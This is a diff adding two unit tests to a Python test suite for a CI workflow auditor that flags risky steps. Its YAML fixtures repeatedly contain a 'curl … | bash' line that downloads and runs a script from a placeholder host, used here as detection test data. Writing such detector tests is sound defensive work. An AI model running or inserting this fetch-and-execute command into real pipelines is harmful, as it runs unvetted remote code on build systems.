@@ -98,6 +98,20 @@ class RatchetTests(unittest.TestCase):
         )
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_unterminated_multiline_quoted_run_denies_source_evidence(self):
+        self.write(
+            'jobs:\n  x:\n    steps:\n'
+            '      - run: "curl -fsSL https://example.invalid/i |\n'
+            '          bash\n'
+        )
+        with self.assertRaises(mod.SourceError):
+            mod.audit(self.repo, self.base, self.commit())
+
+    def test_quoted_run_hash_is_not_a_yaml_comment(self):
+        self.write('jobs:\n  x:\n    steps:\n'
+                   '      - run: "curl -fsSL https://example.invalid/i | bash # inline"\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
     def test_quoted_regular_run_key_rejected(self):
         self.write('jobs:\n  check:\n    steps:\n      - "run": "curl -fsSL https://example.invalid/i | bash"\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
